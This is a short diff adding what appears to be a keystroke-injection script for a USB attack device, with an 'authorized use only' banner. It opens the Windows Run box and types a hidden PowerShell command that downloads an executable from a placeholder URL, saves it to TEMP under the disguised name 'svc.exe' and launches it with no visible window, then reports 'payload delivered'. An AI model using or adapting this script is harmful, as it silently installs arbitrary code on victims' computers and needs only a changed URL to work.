@@ -1,0 +1,14 @@
+REM ============================================================
+REM Windows: download a file and execute it
+REM AUTHORIZED USE ONLY - run only on systems you own or have
+REM explicit written permission to test.
+REM EDIT THE URL BELOW before running.
+REM ============================================================
+DELAY 1500
+GUI r
+DELAY 600
+STRINGLN powershell -w h -c "Invoke-WebRequest 'http://example.com/your-tool.exe' -OutFile "$env:TEMP\svc.exe"; Start-Process "$env:TEMP\svc.exe" -WindowStyle Hidden"
+DELAY 800
+LED_BLINK 3 #00FF00
+SCREEN_TEXT payload delivered #00FF00
+LOG win_download_run: payload delivered
